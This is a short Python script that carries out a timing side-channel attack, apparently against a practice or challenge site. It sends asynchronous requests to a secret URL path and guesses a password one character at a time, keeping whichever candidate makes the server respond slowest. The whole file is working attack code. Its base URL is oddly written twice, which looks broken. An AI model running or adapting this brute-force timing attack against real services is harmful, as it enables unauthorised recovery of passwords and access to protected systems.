import asyncio,aiohttp
import time
from statistics import stdev


async def main():
    BASEURL = 'https://yoscybersite.herokuapp.com/secret/https://yoscybersite.herokuapp.com/secret/'

    chars = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')

    password = 'CyB3r' + 8 * '0'

    async with aiohttp.ClientSession() as client:
        for i in range(5,14):

            winner_time = 0
            winner = ''
            values = []
            for letter in chars:

                check = password[:i] + letter + password[i+1:]

                shortest_time = None
                for j in range(5):
                    while True:
                        try:
                            start = time.monotonic()
                            await client.get(BASEURL+check)
                            diff = time.monotonic() - start

                            if shortest_time is None or diff < shortest_time:
                                shortest_time = diff
                            break
                        except:
                            time.sleep(5)
                            continue
                values.append(shortest_time)
                if shortest_time > winner_time:
                    winner_time = shortest_time
                    winner = letter
                    print('New Winner:',check,winner_time)
                else:
                    print(check,shortest_time)

            password = password[:i] + winner + password[i+1:]
            print('New password:',password, stdev(values)*100,'%')
loop = asyncio.get_event_loop()
loop.run_until_complete(main())



